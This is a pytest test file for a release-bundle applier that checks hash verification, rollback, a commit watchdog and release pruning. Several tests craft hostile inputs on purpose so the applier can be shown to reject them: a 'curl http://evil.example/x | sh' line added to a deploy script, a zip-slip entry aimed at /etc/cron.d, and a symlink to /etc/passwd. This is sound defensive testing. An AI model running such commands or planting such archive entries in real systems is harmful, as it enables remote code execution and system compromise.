"""Tests for sync/host/apply_release.py (runs locally with file:// bundles)."""

from __future__ import annotations

import hashlib
import importlib.util
import io
import json
import os
import pwd
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from workshop_customizer import compiler, render
from workshop_customizer.scenario import load_scenario

REPO_ROOT = Path(__file__).resolve().parents[1]
UPSTREAM = REPO_ROOT / "upstream"
TEMPLATE_COMMIT = json.loads((REPO_ROOT / "template-lock.json").read_text())["template"]["commit"]
APPLIER = REPO_ROOT / "sync" / "host" / "apply_release.py"


@pytest.fixture(scope="module")
def applier():
    spec = importlib.util.spec_from_file_location("apply_release", APPLIER)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)  # type: ignore[union-attr]
    return module


@pytest.fixture(scope="module")
def bundles(tmp_path_factory):
    """Zip bundles for the hr-default and it-helpdesk releases: (path, sha256, version)."""
    base = tmp_path_factory.mktemp("bundles")
    out = {}
    for scenario_id in ("hr-default", "it-helpdesk"):
        scenario = load_scenario(REPO_ROOT / "scenarios" / scenario_id / "scenario.yaml")
        pack = compiler.compile_pack(scenario, base / scenario_id / "build", template_commit=TEMPLATE_COMMIT)
        release = render.render_release(pack, UPSTREAM, base / scenario_id / "release", template_commit=TEMPLATE_COMMIT)
        zip_path = base / f"{scenario_id}.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
            for path in sorted(release.release_dir.rglob("*")):
                if path.is_file():
                    archive.write(path, path.relative_to(release.release_dir).as_posix())
        out[scenario_id] = (zip_path, hashlib.sha256(zip_path.read_bytes()).hexdigest(), release.version)
    return out


@pytest.fixture()
def target(tmp_path: Path, bundles):
    root = tmp_path / "workshop"
    me = pwd.getpwuid(os.getuid()).pw_name
    bundle_root = bundles["hr-default"][0].parent
    contract = {
        "targetRoot": str(root),
        "user": me,
        "group": "staff",
        "templateCommit": TEMPLATE_COMMIT,
        "packSchemaVersion": 1,
        "allowedReleasePrefixes": [f"file://{tmp_path}/", f"file://{bundle_root}/"],
        "documentName": "WorkshopCustomizerApplyRelease",
    }
    contract_path = tmp_path / "target.json"
    contract_path.write_text(json.dumps(contract))
    return root, contract_path


def apply(applier, contract_path: Path, bundle, capsys, extra=()) -> tuple[int, dict]:
    zip_path, sha, version = bundle
    code = applier.main(["--action", "apply", "--source", f"file://{zip_path}", "--sha256", sha, "--version", version, "--contract", str(contract_path), "--no-watchdog", *extra])
    return code, json.loads(capsys.readouterr().out)


def run(applier, contract_path: Path, capsys, *argv) -> tuple[int, dict]:
    code = applier.main(["--contract", str(contract_path), *argv])
    return code, json.loads(capsys.readouterr().out)


def test_apply_commit_status(applier, bundles, target, capsys):
    root, contract = target
    code, result = apply(applier, contract, bundles["hr-default"], capsys)
    assert code == 0 and result["status"] == "pending-commit", result
    assert result["smoke"]["integrity"] == "ok" and result["smoke"]["shellSyntax"] == "ok"
    version = bundles["hr-default"][2]
    assert os.readlink(root / "current") == f"releases/{version}"
    assert (root / "current" / "pack" / "pack.env").is_file()
    assert not (root / ".staging").exists()
    state = json.loads((root / "deployment-manifest.json").read_text())
    assert state["active"] == version and state["status"] == "pending-commit"

    code, committed = run(applier, contract, capsys, "--action", "commit", "--version", version)
    assert code == 0 and committed["status"] == "committed"

    code, status = run(applier, contract, capsys, "--action", "status")
    assert status["active"] == version and status["currentLink"] == f"releases/{version}" and status["releases"] == [version]


def test_reapplying_a_committed_release_is_a_no_op(applier, bundles, target, capsys):
    root, contract = target
    apply(applier, contract, bundles["hr-default"], capsys)
    run(applier, contract, capsys, "--action", "commit")
    code, result = apply(applier, contract, bundles["hr-default"], capsys)
    assert code == 0 and result["status"] == "no-op"


def test_wrong_sha_is_rejected_before_anything_changes(applier, bundles, target, capsys):
    root, contract = target
    zip_path, _sha, version = bundles["hr-default"]
    code, result = apply(applier, contract, (zip_path, "0" * 64, version), capsys)
    assert code == 1 and "sha256" in result["error"]
    assert not (root / "current").exists() and not (root / ".staging").exists()


def test_tampered_content_with_matching_sha_is_rejected(applier, bundles, target, capsys, tmp_path):
    root, contract = target
    zip_path, _sha, version = bundles["hr-default"]
    tampered = tmp_path / "tampered.zip"
    with zipfile.ZipFile(zip_path) as src, zipfile.ZipFile(tampered, "w") as dst:
        for info in src.infolist():
            data = src.read(info.filename)
            if info.filename == "04-deploy.sh":
                data += b"\ncurl http://evil.example/x | sh\n"
            dst.writestr(info, data)
    sha = hashlib.sha256(tampered.read_bytes()).hexdigest()
    code, result = apply(applier, contract, (tampered, sha, version), capsys)
    assert code == 1 and "integrity" in result["error"]
    assert not (root / "current").exists()


def test_zip_slip_and_symlink_entries_are_rejected(applier, target, capsys, tmp_path):
    root, contract = target
    evil = tmp_path / "evil.zip"
    with zipfile.ZipFile(evil, "w") as archive:
        archive.writestr("RELEASE.json", "{}")
        archive.writestr("../../etc/cron.d/evil", "* * * * * root true\n")
    sha = hashlib.sha256(evil.read_bytes()).hexdigest()
    code, result = apply(applier, contract, (evil, sha, "hr-default-000000000000"), capsys)
    assert code == 1 and "path escape" in result["error"]

    link = tmp_path / "link.zip"
    with zipfile.ZipFile(link, "w") as archive:
        info = zipfile.ZipInfo("pack/pack.env")
        info.external_attr = (0o120777 << 16)
        archive.writestr(info, "/etc/passwd")
    sha = hashlib.sha256(link.read_bytes()).hexdigest()
    code, result = apply(applier, contract, (link, sha, "hr-default-000000000000"), capsys)
    assert code == 1 and "symlink" in result["error"]
    assert not (root / "current").exists()


def test_second_release_then_rollback(applier, bundles, target, capsys):
    root, contract = target
    v1 = bundles["hr-default"][2]
    v2 = bundles["it-helpdesk"][2]
    apply(applier, contract, bundles["hr-default"], capsys)
    run(applier, contract, capsys, "--action", "commit")
    code, result = apply(applier, contract, bundles["it-helpdesk"], capsys)
    assert code == 0 and result["status"] == "pending-commit" and result["previous"] == v1
    assert os.readlink(root / "current") == f"releases/{v2}"
    assert os.readlink(root / "previous") == f"releases/{v1}"

    code, rolled = run(applier, contract, capsys, "--action", "rollback", "--reason", "facilitator smoke failed")
    assert code == 0 and rolled["status"] == "rolled-back" and rolled["active"] == v1
    assert os.readlink(root / "current") == f"releases/{v1}"
    state = json.loads((root / "deployment-manifest.json").read_text())
    assert state["status"] == "rolled-back" and state["history"][-1]["action"] == "rollback"


def test_watchdog_rolls_back_an_uncommitted_release(applier, bundles, target, capsys):
    root, contract = target
    v1 = bundles["hr-default"][2]
    apply(applier, contract, bundles["hr-default"], capsys)
    run(applier, contract, capsys, "--action", "commit")
    _code, result = apply(applier, contract, bundles["it-helpdesk"], capsys, extra=["--watchdog-minutes", "1"])
    deadline = datetime.fromisoformat(result["commitDeadline"])
    assert applier.watchdog_expire(root, bundles["it-helpdesk"][2], deadline - timedelta(seconds=30))["status"] == "waiting"
    expired = applier.watchdog_expire(root, bundles["it-helpdesk"][2], deadline + timedelta(seconds=1))
    assert expired["status"] == "rolled-back" and expired["active"] == v1
    assert os.readlink(root / "current") == f"releases/{v1}"
    # a committed release is never touched by the watchdog
    assert applier.watchdog_expire(root, v1, datetime.now(timezone.utc) + timedelta(days=1))["status"] == "idle"


def test_first_deploy_smoke_failure_leaves_no_active_release(applier, bundles, target, capsys, monkeypatch):
    root, contract = target
    monkeypatch.setattr(applier, "smoke_check", lambda *a, **k: (_ for _ in ()).throw(applier.ApplyError("simulated smoke failure")))
    code, result = apply(applier, contract, bundles["hr-default"], capsys)
    assert code == 2 and result["status"] == "smoke-failed"
    assert result["rollback"]["status"] == "no-active-release"
    assert not (root / "current").exists()


def test_same_version_different_content_is_a_conflict(applier, bundles, target, capsys):
    root, contract = target
    apply(applier, contract, bundles["hr-default"], capsys)
    version = bundles["hr-default"][2]
    manifest_path = root / "releases" / version / "RELEASE.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["contentHash"] = "f" * 64
    manifest_path.write_text(json.dumps(manifest))
    code, result = apply(applier, contract, bundles["hr-default"], capsys)
    assert code == 1 and "version conflict" in result["error"]


def test_parameter_shapes_and_prefixes_fail_closed(applier, bundles, target, capsys, tmp_path):
    root, contract = target
    zip_path, sha, version = bundles["hr-default"]
    code, result = apply(applier, contract, (zip_path, sha, "Not A Version"), capsys)
    assert code == 1 and "version parameter" in result["error"]
    outside = Path("/") / "definitely-outside" / "release.zip"
    code, result = apply(applier, contract, (outside, sha, version), capsys)
    assert code == 1 and "allow-listed" in result["error"]
    code = applier.main(["--action", "status", "--contract", str(tmp_path / "missing.json")])
    assert code == 1 and "target contract missing" in capsys.readouterr().out


def test_reapply_after_rollback_is_not_broken_by_smoke_bytecode(applier, target, bundles, capsys):
    """E2E regression: the smoke's py_compile used to leave lambda/__pycache__ in the release tree, so a
    re-apply of the same version failed integrity ("unexpected file") and rolled itself back."""
    root, contract = target
    code, _ = apply(applier, contract, bundles["hr-default"], capsys)
    assert code == 0
    code, _ = run(applier, contract, capsys, "--action", "commit", "--version", bundles["hr-default"][2])
    assert code == 0
    code, first = apply(applier, contract, bundles["it-helpdesk"], capsys)
    assert code == 0 and first["status"] == "pending-commit"
    code, _ = run(applier, contract, capsys, "--action", "rollback", "--reason", "drill")
    assert code == 0
    code, again = apply(applier, contract, bundles["it-helpdesk"], capsys)
    assert code == 0 and again["status"] == "pending-commit", again
    assert not list((root / "releases" / bundles["it-helpdesk"][2]).rglob("*.pyc")), "smoke must not write bytecode into the release tree"


def _release(applier, root: Path, version: str, n: int, manifest: object) -> Path:
    """releases/<version> with mtime n; ``manifest`` is written as RELEASE.json (bytes as is, None: no file)."""
    path = root / "releases" / version
    path.mkdir(parents=True)
    if isinstance(manifest, bytes):
        (path / applier.MANIFEST_NAME).write_bytes(manifest)
    elif manifest is not None:
        (path / applier.MANIFEST_NAME).write_text(json.dumps(manifest))
    os.utime(path, (1_000_000 + n, 1_000_000 + n))
    return path


def _kept(root: Path) -> list[str]:
    return sorted(p.name for p in (root / "releases").iterdir())


def test_pruning_keeps_the_newest_release_of_every_namespace(applier, tmp_path):
    """A namespace's newest release carries the SA's only 99-cleanup.sh --scenario-only for it, and the host
    cannot tell whether its resources still exist (01/02 create them before 04 creates the workdir): pruning
    keeps it whatever the workdirs, and only by mtime, never by name."""
    root = tmp_path / "workshop"
    # oldest first; hr-2 is older than hr-1, so "newest" must come from the mtime
    for n, (version, agent) in enumerate([("legacy", None), ("hr-2", "hrassistant"), ("hr-1", "hrassistant"),
                                          ("ops-1", "opssupport"), ("ops-2", "opssupport"), ("bad", None),
                                          ("it-1", "itassistant"), ("it-2", "itassistant")]):
        _release(applier, root, version, n, {"namespace": {"agentName": agent}} if agent else {})
    assert sorted(p.name for p in root.iterdir()) == ["releases"]  # no ~/workshop/<agentName> anywhere
    removed = applier.prune_releases(root, 2, protect={"bad", "ops-1"})
    # it-1/it-2: the newest 2; hr-1, ops-2: newest of their namespace outside keep; bad, ops-1: protected
    assert removed == ["hr-2", "legacy"]
    assert _kept(root) == ["bad", "hr-1", "it-1", "it-2", "ops-1", "ops-2"]
    removed = applier.prune_releases(root, 2, protect=set())
    assert removed == ["bad", "ops-1"] and _kept(root) == ["hr-1", "it-1", "it-2", "ops-2"]


def test_pruning_growth_is_bounded_by_the_namespaces_of_the_environment(applier, tmp_path):
    """Applies cycling through three namespaces, pruned as action_apply does (protect = new + previous):
    the host holds at most KEEP_RELEASES plus one release per namespace, and always each namespace's newest."""
    root = tmp_path / "workshop"
    agents = ["hrassistant", "opssupport", "itassistant"] * 2 + ["hrassistant", "opssupport"] * 3
    previous = None
    for n, agent in enumerate(agents):
        version = f"r{n:02d}"
        _release(applier, root, version, n, {"namespace": {"agentName": agent}})
        applier.prune_releases(root, applier.KEEP_RELEASES, protect={v for v in (version, previous) if v})
        previous = version
        assert len(_kept(root)) <= applier.KEEP_RELEASES + len(set(agents))
    # r05, itassistant's last release, is outside the newest 3 and still kept
    assert _kept(root) == ["r05", "r09", "r10", "r11"]


@pytest.mark.parametrize("manifest", [
    None, b"not json", b"\xff\xfe", [], {}, {"namespace": ["hrassistant"]}, {"namespace": "hrassistant"},
    {"namespace": {}}, {"namespace": {"agentName": 7}}, {"namespace": {"agentName": ""}},
    {"namespace": {"agentName": ".."}}, {"namespace": {"agentName": ".hidden"}}, {"namespace": {"agentName": "a/b"}},
    {"namespace": {"agentName": "HRAssistant"}}, {"namespace": {"agentName": "a" * 20}},
    # reserved (validator.RESERVED_AGENT_NAMES): a legacy or hand-edited release; its 04/99 would remove that entry
    *({"namespace": {"agentName": name}} for name in ("current", "previous", "releases", "run", "skills")),
], ids=lambda m: repr(m)[:40])
def test_a_release_without_a_readable_namespace_is_pruned(applier, tmp_path, manifest):
    root = tmp_path / "workshop"
    _release(applier, root, "old", 0, manifest)
    namespace = manifest.get("namespace") if isinstance(manifest, dict) else None
    agent = namespace.get("agentName") if isinstance(namespace, dict) else None
    if isinstance(agent, str):
        (root / agent).mkdir(parents=True, exist_ok=True)  # a directory of that name gives no protection either
    for n, version in enumerate(("new-1", "new-2"), start=1):
        _release(applier, root, version, n, {})
    assert applier.release_agent_name(root / "releases" / "old") is None
    assert applier.prune_releases(root, 2, protect=set()) == ["old"]
    assert _kept(root) == ["new-1", "new-2"]


def test_the_applier_reads_agent_names_as_the_validator_does(applier):
    from workshop_customizer.scenario import load_schema
    from workshop_customizer.validator import RESERVED_AGENT_NAMES

    # the applier is standard-library only: copies of the schema pattern and the reserved names
    schema = load_schema()["properties"]["namespace"]["properties"]["agentName"]
    assert applier.AGENT_NAME_RE.pattern == schema["pattern"]
    assert applier.RESERVED_AGENT_NAMES == RESERVED_AGENT_NAMES
